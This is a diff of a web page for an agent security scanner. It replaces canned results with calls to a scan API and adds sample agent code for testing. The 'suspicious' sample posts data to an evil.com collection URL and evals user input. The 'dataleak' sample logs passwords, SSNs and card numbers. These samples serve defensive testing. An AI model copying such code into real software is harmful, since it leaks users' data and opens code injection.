@@ -76,36 +76,8 @@
       background-clip: text;
     }
 
-    .gradient-text-red {
-      background: linear-gradient(135deg, #ef4444, #f97316);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      background-clip: text;
-    }
-
-    .gradient-text-yellow {
-      background: linear-gradient(135deg, #eab308, #f97316);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      background-clip: text;
-    }
-
     .code-font {
       font-family: 'JetBrains Mono', 'SF Mono', 'Monaco', 'Consolas', monospace;
-    }
-
-    @keyframes scan {
-      0% { transform: translateY(0); opacity: 0; }
-      50% { opacity: 1; }
-      100% { transform: translateY(100%); opacity: 0; }
-    }
-
-    .scan-line {
-      position: absolute;
-      width: 100%;
-      height: 2px;
-      background: linear-gradient(90deg, transparent, #22c55e, transparent);
-      animation: scan 1.5s ease-in-out infinite;
     }
 
     @keyframes pulse {
@@ -126,8 +98,8 @@
       animation: spin 1s linear infinite;
     }
 
-    .hidden { display: none; }
-    .show { display: block; }
+    .hidden { display: none !important; }
+    .show { display: block !important; }
 
     .risk-high { border-color: rgba(239, 68, 68, 0.5); background: rgba(239, 68, 68, 0.1); }
     .risk-medium { border-color: rgba(234, 179, 8, 0.5); background: rgba(234, 179, 8, 0.1); }
@@ -157,22 +129,40 @@
         <h2 class="text-2xl font-bold mb-6 flex items-center gap-3">
           <span>🔍</span> Verify Agent Security
         </h2>
-        <div class="grid md:grid-cols-2 gap-6 mb-6">
-          <div>
-            <label class="block text-sm font-medium text-gray-400 mb-2">Agent ID / Address</label>
-            <input type="text" id="agentId" placeholder="0x1234... or agent-name"
-              class="w-full px-4 py-3 rounded-lg bg-black/50 border border-gray-700 focus:border-green-500 focus:outline-none code-font text-sm">
-          </div>
-          <div>
-            <label class="block text-sm font-medium text-gray-400 mb-2">Verification Type</label>
-            <select id="verifyType" class="w-full px-4 py-3 rounded-lg bg-black/50 border border-gray-700 focus:border-green-500 focus:outline-none">
-              <option value="comprehensive">Comprehensive Security Audit</option>
-              <option value="code">Code Analysis Only</option>
-              <option value="behavior">Behavior Sandbox Only</option>
-              <option value="privacy">Privacy Audit Only</option>
-            </select>
+
+        <!-- Sample code selector -->
+        <div class="mb-6 p-4 rounded-lg" style="background: rgba(34, 197, 94, 0.1);">
+          <p class="text-sm text-gray-400 mb-2">Select a sample agent to test:</p>
+          <div class="flex gap-2 flex-wrap">
+            <button onclick="loadSample('safe')" class="px-3 py-1.5 rounded-lg text-sm font-medium bg-green-600/20 text-green-400 hover:bg-green-600/30 transition-colors">Safe Agent</button>
+            <button onclick="loadSample('lodash')" class="px-3 py-1.5 rounded-lg text-sm font-medium bg-yellow-600/20 text-yellow-400 hover:bg-yellow-600/30 transition-colors">Vulnerable Dependencies</button>
+            <button onclick="loadSample('suspicious')" class="px-3 py-1.5 rounded-lg text-sm font-medium bg-red-600/20 text-red-400 hover:bg-red-600/30 transition-colors">Suspicious Code</button>
+            <button onclick="loadSample('dataleak')" class="px-3 py-1.5 rounded-lg text-sm font-medium bg-red-600/20 text-red-400 hover:bg-red-600/30 transition-colors">Data Leakage</button>
           </div>
         </div>
+
+        <div class="mb-6">
+          <label class="block text-sm font-medium text-gray-400 mb-2">Agent ID / Address</label>
+          <input type="text" id="agentId" placeholder="0x1234... or agent-name"
+            class="w-full px-4 py-3 rounded-lg bg-black/50 border border-gray-700 focus:border-green-500 focus:outline-none code-font text-sm">
+        </div>
+
+        <div class="mb-6">
+          <label class="block text-sm font-medium text-gray-400 mb-2">Agent Code (JavaScript/TypeScript)</label>
+          <textarea id="agentCode" rows="8" placeholder="Paste your agent code here..."
+            class="w-full px-4 py-3 rounded-lg bg-black/50 border border-gray-700 focus:border-green-500 focus:outline-none code-font text-sm"></textarea>
+        </div>
+
+        <div class="mb-6">
+          <label class="block text-sm font-medium text-gray-400 mb-2">Verification Type</label>
+          <select id="verifyType" class="w-full px-4 py-3 rounded-lg bg-black/50 border border-gray-700 focus:border-green-500 focus:outline-none">
+            <option value="comprehensive">Comprehensive Security Audit</option>
+            <option value="code">Code Analysis Only</option>
+            <option value="behavior">Behavior Sandbox Only</option>
+            <option value="privacy">Privacy Audit Only</option>
+          </select>
+        </div>
+
         <button id="startBtn" onclick="startVerification()"
           class="w-full py-4 rounded-lg font-bold text-lg transition-all"
           style="background: linear-gradient(135deg, #22c55e, #22d3ee); color: black;">
@@ -213,99 +203,17 @@
       <div id="resultsSection" class="hidden">
         <!-- Score Header -->
         <div class="text-center mb-8">
-          <div class="text-7xl font-black gradient-text mb-2" id="overallScore">82</div>
+          <div class="text-7xl font-black gradient-text mb-2" id="overallScore">--</div>
           <p class="text-xl text-gray-400">Overall Security Score</p>
-          <div class="inline-flex items-center gap-2 mt-3 px-4 py-2 rounded-full" style="background: rgba(234, 179, 8, 0.2);">
-            <span class="w-2 h-2 rounded-full bg-yellow-500 pulse"></span>
-            <span class="text-yellow-400 font-semibold">Moderate Risk - 2 Issues Found</span>
+          <div class="inline-flex items-center gap-2 mt-3 px-4 py-2 rounded-full" id="riskBadge">
+            <span class="w-2 h-2 rounded-full bg-green-500 pulse"></span>
+            <span class="text-green-400 font-semibold" id="riskText">Analyzing...</span>
           </div>
         </div>
 
         <!-- Analysis Results -->
-        <div class="grid md:grid-cols-3 gap-6 mb-8">
-          <!-- Code Security -->
-          <div class="glass-card-strong p-6">
-            <div class="flex items-center justify-between mb-4">
-              <h4 class="font-bold flex items-center gap-2">
-                <span class="text-2xl">📊</span> Code Security
-              </h4>
-              <span class="text-2xl font-bold text-green-400">85</span>
-            </div>
-            <div class="space-y-2 text-sm">
-              <div class="flex justify-between text-gray-400">
-                <span>Smart Contract Vulnerabilities</span>
-                <span class="text-green-400">✓ Pass</span>
-              </div>
-              <div class="flex justify-between text-gray-400">
-                <span>Malicious Code Patterns</span>
-                <span class="text-green-400">✓ Pass</span>
-              </div>
-              <div class="flex justify-between text-gray-400">
-                <span>Dependency Security</span>
-                <span class="text-yellow-400">⚠ Warning</span>
-              </div>
-              <div class="flex justify-between text-gray-400">
-                <span>Code Quality</span>
-                <span class="text-green-400">85/100</span>
-              </div>
-            </div>
-          </div>
-
-          <!-- Behavior Sandbox -->
-          <div class="glass-card-strong p-6">
-            <div class="flex items-center justify-between mb-4">
-              <h4 class="font-bold flex items-center gap-2">
-                <span class="text-2xl">⚙️</span> Behavior Sandbox
-              </h4>
-              <span class="text-2xl font-bold text-yellow-400">78</span>
-            </div>
-            <div class="space-y-2 text-sm">
-              <div class="flex justify-between text-gray-400">
-                <span>File System Access</span>
-                <span class="text-green-400">✓ Normal</span>
-              </div>
-              <div class="flex justify-between text-gray-400">
-                <span>Network Requests</span>
-                <span class="text-yellow-400">⚠ External API</span>
-              </div>
-              <div class="flex justify-between text-gray-400">
-                <span>API Calls</span>
-                <span class="text-green-400">✓ Safe</span>
-              </div>
-              <div class="flex justify-between text-gray-400">
-                <span>Resource Usage</span>
-                <span class="text-green-400">✓ Normal</span>
-              </div>
-            </div>
-          </div>
-
-          <!-- Privacy Audit -->
-          <div class="glass-card-strong p-6">
-            <div class="flex items-center justify-between mb-4">
-              <h4 class="font-bold flex items-center gap-2">
-                <span class="text-2xl">🔒</span> Privacy Audit
-              </h4>
-              <span class="text-2xl font-bold text-green-400">88</span>
-            </div>
-            <div class="space-y-2 text-sm">
-              <div class="flex justify-between text-gray-400">
-                <span>Data Leak Detection</span>
-                <span class="text-green-400">✓ None</span>
-              </div>
-              <div class="flex justify-between text-gray-400">
-                <span>Encryption</span>
-                <span class="text-green-400">✓ Enabled</span>
-              </div>
-              <div class="flex justify-between text-gray-400">
-                <span>Third-party Sharing</span>
-                <span class="text-green-400">✓ None</span>
-              </div>
-              <div class="flex justify-between text-gray-400">
-                <span>Log Safety</span>
-                <span class="text-yellow-400">⚠ Review</span>
-              </div>
-            </div>
-          </div>
+        <div class="grid md:grid-cols-3 gap-6 mb-8" id="categoryScores">
+          <!-- Filled dynamically -->
         </div>
 
         <!-- Detailed Report -->
@@ -313,50 +221,8 @@
           <h4 class="font-bold text-xl mb-4 flex items-center gap-2">
             <span>📋</span> Security Report Details
           </h4>
-
-          <!-- High Risk -->
-          <div class="risk-high rounded-lg p-4 mb-4">
-            <div class="flex items-start gap-3">
-              <span class="text-red-500 text-xl">🔴</span>
-              <div class="flex-1">
-                <h5 class="font-bold text-red-400 mb-1">Medium Risk (1 item)</h5>
-                <p class="text-sm text-gray-300 mb-2">Dependency package <code class="code-font bg-black/30 px-1 rounded">lodash@4.17.15</code> has known CVE</p>
-                <p class="text-xs text-gray-400">💡 Recommendation: Upgrade to version 4.17.21 or later</p>
-              </div>
-            </div>
-          </div>
-
-          <!-- Medium Risk -->
-          <div class="risk-medium rounded-lg p-4 mb-4">
-            <div class="flex items-start gap-3">
-              <span class="text-yellow-500 text-xl">🟡</span>
-              <div class="flex-1">
-                <h5 class="font-bold text-yellow-400 mb-1">Low Risk (2 items)</h5>
-                <div class="space-y-2 text-sm">
-                  <p class="text-gray-300">• External API call to <code class="code-font bg-black/30 px-1 rounded">api.thirdparty.com</code> detected</p>
-                  <p class="text-gray-300">• Logs may contain partial user input data</p>
-                </div>
-                <p class="text-xs text-gray-400 mt-2">💡 Recommendations: Review API usage, add to whitelist; implement log sanitization</p>
-              </div>
-            </div>
-          </div>
-
-          <!-- Passed Items -->
-          <div class="risk-low rounded-lg p-4">
-            <div class="flex items-start gap-3">
-              <span class="text-green-500 text-xl">✅</span>
-              <div class="flex-1">
-                <h5 class="font-bold text-green-400 mb-2">Passed Checks</h5>
-                <div class="grid grid-cols-2 md:grid-cols-3 gap-2 text-sm text-gray-300">
-                  <span>• No malicious code</span>
-                  <span>• No data leaks</span>
-                  <span>• Normal resource usage</span>
-                  <span>• Proper encryption</span>
-                  <span>• Safe file access</span>
-                  <span>• No infinite loops</span>
-                </div>
-              </div>
-            </div>
+          <div id="issueList">
+            <!-- Filled dynamically -->
           </div>
         </div>
 
@@ -365,9 +231,21 @@
           <button onclick="downloadReport()" class="flex-1 py-3 rounded-lg font-semibold border border-gray-600 hover:border-green-500 transition-colors">
             📥 Download Report
           </button>
-          <button onclick="recalculateFix()" class="flex-1 py-3 rounded-lg font-semibold transition-colors"
+          <button onclick="resetForm()" class="flex-1 py-3 rounded-lg font-semibold transition-colors"
             style="background: rgba(34, 197, 94, 0.2); color: #22c55e;">
-            🔄 Recalculate After Fix
+            🔄 Scan Another Agent
+          </button>
+        </div>
+      </div>
+
+      <!-- Error Section -->
+      <div id="errorSection" class="hidden">
+        <div class="text-center py-12">
+          <div class="text-6xl mb-4">❌</div>
+          <h3 class="text-2xl font-bold mb-2 text-red-400">Scan Failed</h3>
+          <p class="text-gray-400 mb-6" id="errorMessage">An error occurred during scanning.</p>
+          <button onclick="resetForm()" class="px-6 py-3 rounded-lg font-semibold bg-gray-700 hover:bg-gray-600 transition-colors">
+            Try Again
           </button>
         </div>
       </div>
@@ -401,10 +279,121 @@
   </div>
 
   <script>
-    function startVerification() {
+    // API configuration
+    const API_BASE = window.location.origin;
+    let currentResult = null;
+
+    // Sample agent codes
+    const sampleAgents = {
+      safe: `// Safe agent - no security issues
+function processData(input) {
+  // Validate input
+  if (!input || typeof input !== 'string') {
+    throw new Error('Invalid input');
+  }
+
+  // Process data safely
+  const result = input.toUpperCase();
+  return result;
+}
+
+// Export for use
+module.exports = { processData };`,
+
+      lodash: `// Agent with vulnerable dependencies
+// This code itself is safe, but package.json has vulnerable lodash
+
+const _ = require('lodash');
+
+function processUserData(users) {
+  // Using lodash functions
+  const activeUsers = _.filter(users, user => user.active);
+  const sortedUsers = _.orderBy(activeUsers, ['name'], ['asc']);
+
+  return sortedUsers;
+}
+
+module.exports = { processUserData };`,
+
+      suspicious: `// Suspicious agent - malicious patterns
+function UserDataProcessor() {
+  // Potential infinite loop
+  while (true) {
+    // Process data
+  }
+}
+
+// Dynamic code execution
+function executeCode(userInput) {
+  eval(userInput);
+}
+
+// External data exfiltration
+function sendData(data) {
+  fetch('https://external-api.evil.com/collect', {
+    method: 'POST',
+    body: JSON.stringify(data)
+  });
+}
+
+// Hardcoded secret
+const API_KEY = 'sk-1234567890abcdefghijklmnop';
+
+module.exports = { UserDataProcessor, executeCode, sendData };`,
+
+      dataleak: `// Agent with privacy issues
+function logUserActivity(user) {
+  // Logging sensitive data
+  console.log('User login:', user.email, user.password);
+  console.log('SSN:', user.ssn);
+  console.log('Credit Card:', user.creditCard);
+}
+
+function storeToken(token) {
+  // Storing token in localStorage (unencrypted)
+  localStorage.setItem('authToken', token);
+}
+
+function sendDataExternal(data) {
+  // Sending to third-party without encryption
+  fetch('https://api.thirdparty.com/analyze', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({
+      email: data.userEmail,
+      phone: data.userPhone,
+      address: data.homeAddress
+    })
+  });
+}
+
+module.exports = { logUserActivity, storeToken, sendDataExternal };`
+    };
+
+    function loadSample(type) {
+      document.getElementById('agentCode').value = sampleAgents[type] || '';
+      document.getElementById('agentId').value = `sample-${type}-agent`;
+    }
+
+    async function startVerification() {
+      const agentCode = document.getElementById('agentCode').value;
+      const agentId = document.getElementById('agentId').value || 'unknown';
+      const verifyType = document.getElementById('verifyType').value;
+
+      if (!agentCode.trim()) {
+        alert('Please enter agent code or select a sample');
+        return;
+      }
+
+      // Show scanning UI
       document.getElementById('inputSection').classList.add('hidden');
       document.getElementById('scanningSection').classList.remove('hidden');
+      document.getElementById('resultsSection').classList.add('hidden');
+      document.getElementById('errorSection').classList.add('hidden');
 
+      // Animate steps
       const steps = document.querySelectorAll('#scanSteps > div');
       const statuses = [
         'Scanning for smart contract vulnerabilities...',
@@ -426,85 +415,304 @@
           currentStep++;
         } else {
           clearInterval(interval);
-          setTimeout(() => {
-            document.getElementById('scanningSection').classList.add('hidden');
-            document.getElementById('resultsSection').classList.remove('hidden');
-          }, 500);
         }
-      }, 1200);
+      }, 800);
+
+      try {
+        // Call real API
+        const response = await fetch(`${API_BASE}/api/sandbox/scan`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            agentCode,
+            agentId,
+            verifyType,
+            language: 'javascript'
+          })
+        });
+
+        if (!response.ok) {
+          throw new Error(`API error: ${response.status}`);
+        }
+
+        const result = await response.json();
+        currentResult = result;
+
+        // Display results
+        displayResults(result);
+
+      } catch (error) {
+        console.error('Scan error:', error);
+
+        // Show error
+        document.getElementById('scanningSection').classList.add('hidden');
+        document.getElementById('errorSection').classList.remove('hidden');
+        document.getElementById('errorMessage').textContent =
+          error.message || 'Failed to connect to security scanner. Please ensure the API server is running.';
+      }
+    }
+
+    function displayResults(result) {
+      document.getElementById('scanningSection').classList.add('hidden');
+      document.getElementById('resultsSection').classList.remove('hidden');
+
+      // Update score
+      document.getElementById('overallScore').textContent = result.overallScore;
+
+      // Update risk badge
+      const riskBadge = document.getElementById('riskBadge');
+      const riskText = document.getElementById('riskText');
+
+      const riskColors = {
+        safe: 'bg-green-500',
+        low: 'bg-blue-500',
+        medium: 'bg-yellow-500',
+        high: 'bg-orange-500',
+        critical: 'bg-red-500'
+      };
+
+      const riskLabels = {
+        safe: 'Secure - No Issues Found',
+        low: 'Low Risk - Minor Issues',
+        medium: 'Moderate Risk - Issues Found',
+        high: 'High Risk - Major Issues',
+        critical: 'Critical Risk - Severe Issues'
+      };
+
+      riskBadge.querySelector('span:first-child').className =
+        `w-2 h-2 rounded-full ${riskColors[result.riskLevel]} pulse`;
+      riskText.textContent = riskLabels[result.riskLevel];
+      riskText.className = `font-semibold ${result.riskLevel === 'safe' ? 'text-green-400' :
+        result.riskLevel === 'low' ? 'text-blue-400' :
+        result.riskLevel === 'medium' ? 'text-yellow-400' :
+        result.riskLevel === 'high' ? 'text-orange-400' : 'text-red-400'}`;
+
+      // Build category scores
+      const categories = [
+        { key: 'codeSecurity', name: 'Code Security', icon: '📊' },
+        { key: 'behaviorSandbox', name: 'Behavior Sandbox', icon: '⚙️' },
+        { key: 'privacyAudit', name: 'Privacy Audit', icon: '🔒' }
+      ];
+
+      const categoryScoresHtml = categories.map(cat => {
+        const score = result.categories[cat.key].score;
+        const colorClass = score >= 80 ? 'text-green-400' : score >= 60 ? 'text-yellow-400' : 'text-red-400';
+
+        return `
+          <div class="glass-card-strong p-6">
+            <div class="flex items-center justify-between mb-4">
+              <h4 class="font-bold flex items-center gap-2">
+                <span class="text-2xl">${cat.icon}</span> ${cat.name}
+              </h4>
+              <span class="text-2xl font-bold ${colorClass}">${score}</span>
+            </div>
+            <div class="space-y-2 text-sm">
+              ${result.categories[cat.key].checks.map(check => `
+                <div class="flex justify-between text-gray-400">
+                  <span>${check.name}</span>
+                  <span class="${check.passed ? 'text-green-400' : 'text-yellow-400'}">
+                    ${check.passed ? '✓' : '⚠'} ${check.details || (check.passed ? 'Pass' : 'Review')}
+                  </span>
+                </div>
+              `).join('')}
+            </div>
+          </div>
+        `;
+      }).join('');
+
+      document.getElementById('categoryScores').innerHTML = categoryScoresHtml;
+
+      // Build issue list
+      const allIssues = [
+        ...result.categories.codeSecurity.issues,
+        ...result.categories.behaviorSandbox.issues,
+        ...result.categories.privacyAudit.issues
+      ];
+
+      // Group by risk level
+      const criticalIssues = allIssues.filter(i => i.level === 'critical');
+      const highIssues = allIssues.filter(i => i.level === 'high');
+      const mediumIssues = allIssues.filter(i => i.level === 'medium');
+      const lowIssues = allIssues.filter(i => i.level === 'low');
+
+      let issueHtml = '';
+
+      if (criticalIssues.length > 0 || highIssues.length > 0) {
+        issueHtml += `
+          <div class="risk-high rounded-lg p-4 mb-4">
+            <div class="flex items-start gap-3">
+              <span class="text-red-500 text-xl">🔴</span>
+              <div class="flex-1">
+                <h5 class="font-bold text-red-400 mb-1">Critical/High Risk (${criticalIssues.length + highIssues.length} items)</h5>
+                ${criticalIssues.concat(highIssues).map(issue => `
+                  <p class="text-sm text-gray-300 mb-1"><strong>${issue.title}</strong></p>
+                  <p class="text-xs text-gray-400 mb-2">${issue.description}</p>
+                  ${issue.recommendation ? `<p class="text-xs text-gray-400">💡 ${issue.recommendation}</p>` : ''}
+                `).join('')}
+              </div>
+            </div>
+          </div>
+        `;
+      }
+
+      if (mediumIssues.length > 0) {
+        issueHtml += `
+          <div class="risk-medium rounded-lg p-4 mb-4">
+            <div class="flex items-start gap-3">
+              <span class="text-yellow-500 text-xl">🟡</span>
+              <div class="flex-1">
+                <h5 class="font-bold text-yellow-400 mb-1">Medium Risk (${mediumIssues.length} items)</h5>
+                ${mediumIssues.map(issue => `
+                  <p class="text-sm text-gray-300 mb-1"><strong>${issue.title}</strong></p>
+                  <p class="text-xs text-gray-400">${issue.description}</p>
+                `).join('')}
+              </div>
+            </div>
+          </div>
+        `;
+      }
+
+      if (lowIssues.length > 0) {
+        issueHtml += `
+          <div class="risk-low rounded-lg p-4 mb-4">
+            <div class="flex items-start gap-3">
+              <span class="text-green-500 text-xl">🟢</span>
+              <div class="flex-1">
+                <h5 class="font-bold text-green-400 mb-1">Low Risk (${lowIssues.length} items)</h5>
+                ${lowIssues.map(issue => `
+                  <p class="text-sm text-gray-300">${issue.title}: ${issue.description}</p>
+                `).join('')}
+              </div>
+            </div>
+          </div>
+        `;
+      }
+
+      if (allIssues.length === 0) {
+        issueHtml += `
+          <div class="risk-low rounded-lg p-4">
+            <div class="flex items-start gap-3">
+              <span class="text-green-500 text-xl">✅</span>
+              <div class="flex-1">
+                <h5 class="font-bold text-green-400 mb-2">All Checks Passed</h5>
+                <div class="grid grid-cols-2 md:grid-cols-3 gap-2 text-sm text-gray-300">
+                  <span>• No malicious code</span>
+                  <span>• No data leaks</span>
+                  <span>• Normal resource usage</span>
+                  <span>• Proper encryption</span>
+                  <span>• Safe file access</span>
+                  <span>• No infinite loops</span>
+                </div>
+              </div>
+            </div>
+          </div>
+        `;
+      }
+
+      document.getElementById('issueList').innerHTML = issueHtml;
     }
 
     function downloadReport() {
-      const report = `
-MySkills Security Verification Report
-=====================================
+      if (!currentResult) {
+        alert('No scan result to download');
+        return;
+      }
 
-Agent ID: ${document.getElementById('agentId').value || '0x1234...'}
-Verification Date: ${new Date().toISOString()}
-Verification Type: Comprehensive Security Audit
+      // Generate text report
+      const result = currentResult;
+      const lines = [];
 
-OVERALL SCORE: 82/100 (Moderate Risk)
+      lines.push('MySkills Security Verification Report');
+      lines.push('=====================================');
+      lines.push('');
+      lines.push(`Agent ID: ${result.agentId}`);
+      lines.push(`Verification Date: ${result.timestamp}`);
+      lines.push(`Verification Type: Comprehensive Security Audit`);
+      lines.push('');
+      lines.push(`OVERALL SCORE: ${result.overallScore}/100 (${result.riskLevel.toUpperCase()})`);
+      lines.push('');
 
----
-CODE SECURITY: 85/100
-✓ No smart contract vulnerabilities detected
-✓ No malicious code patterns found
-⚠ Dependency package lodash@4.17.15 has known CVE
-✓ Code quality: 85/100
+      // Categories
+      for (const [key, category] of Object.entries(result.categories)) {
+        const name = key === 'codeSecurity' ? 'CODE SECURITY' :
+          key === 'behaviorSandbox' ? 'BEHAVIOR SANDBOX' : 'PRIVACY AUDIT';
+        lines.push(`---`);
+        lines.push(name);
+        lines.push(`---`);
+        lines.push(`Score: ${category.score}/100`);
 
-BEHAVIOR SANDBOX: 78/100
-✓ File system access: Normal
-⚠ External API call detected: api.thirdparty.com
-✓ API calls: Safe
-✓ Resource usage: Normal
+        for (const check of category.checks) {
+          const status = check.passed ? '✓' : '⚠';
+          lines.push(`${status} ${check.name}: ${check.details}`);
+        }
 
-PRIVACY AUDIT: 88/100
-✓ No data leakage detected
-✓ Encryption enabled
-✓ No third-party data sharing
-⚠ Logs may contain user input data
+        for (const issue of category.issues) {
+          lines.push('');
+          lines.push(`[${issue.level.toUpperCase()}] ${issue.title}`);
+          lines.push(`  ${issue.description}`);
+          if (issue.recommendation) {
+            lines.push(`  Recommendation: ${issue.recommendation}`);
+          }
+        }
+        lines.push('');
+      }
 
----
-RECOMMENDATIONS:
-1. Upgrade lodash to 4.17.21 or later
-2. Review and whitelist api.thirdparty.com
-3. Implement log sanitization
+      // Summary
+      lines.push('---');
+      lines.push('SUMMARY');
+      lines.push('---');
+      lines.push(`Total Issues: ${result.summary.totalIssues}`);
+      lines.push(`Critical: ${result.summary.criticalIssues}`);
+      lines.push(`High: ${result.summary.highIssues}`);
+      lines.push(`Medium: ${result.summary.mediumIssues}`);
+      lines.push(`Low: ${result.summary.lowIssues}`);
+      lines.push('');
 
----
-Generated by MySkills Sandbox
-Powered by Monad Blockchain
-      `.trim();
+      // Recommendations
+      if (result.recommendations.length > 0) {
+        lines.push('---');
+        lines.push('RECOMMENDATIONS');
+        lines.push('---');
+        result.recommendations.forEach((rec, i) => {
+          lines.push(`${i + 1}. ${rec}`);
+        });
+        lines.push('');
+      }
 
-      const blob = new Blob([report], { type: 'text/plain' });
+      lines.push('---');
+      lines.push('Generated by MySkills Sandbox');
+      lines.push('Powered by Monad Blockchain');
+
+      const reportText = lines.join('\n');
+
+      // Download
+      const blob = new Blob([reportText], { type: 'text/plain' });
       const url = URL.createObjectURL(blob);
       const a = document.createElement('a');
       a.href = url;
-      a.download = 'security-report.txt';
+      a.download = `security-report-${result.agentId}-${Date.now()}.txt`;
       a.click();
       URL.revokeObjectURL(url);
     }
 
-    function recalculateFix() {
+    function resetForm() {
+      document.getElementById('inputSection').classList.remove('hidden');
+      document.getElementById('scanningSection').classList.add('hidden');
       document.getElementById('resultsSection').classList.add('hidden');
-      document.getElementById('scanningSection').classList.remove('hidden');
+      document.getElementById('errorSection').classList.add('hidden');
 
       // Reset steps
       const steps = document.querySelectorAll('#scanSteps > div');
       steps.forEach(step => {
         step.classList.remove('text-green-400');
         step.classList.add('text-gray-500');
-        step.querySelector('span:first-child').textContent = step.querySelector('span:first-child').textContent.replace('✓', parseInt(step.querySelector('span:first-child').textContent) || '');
+        step.querySelector('span:first-child').innerHTML =
+          step.querySelector('span:first-child').textContent.replace('✓', '');
       });
 
-      document.getElementById('scanStatus').textContent = 'Re-scanning after fixes...';
-
-      // Simulate rescanning with better results
-      setTimeout(() => {
-        document.getElementById('overallScore').textContent = '95';
-        document.querySelector('#resultsSection .inline-flex').innerHTML = '<span class="w-2 h-2 rounded-full bg-green-500"></span><span class="text-green-400 font-semibold">Secure - All Issues Resolved</span>';
-        document.getElementById('scanningSection').classList.add('hidden');
-        document.getElementById('resultsSection').classList.remove('hidden');
-      }, 3000);
+      currentResult = null;
     }
   </script>
 </body>
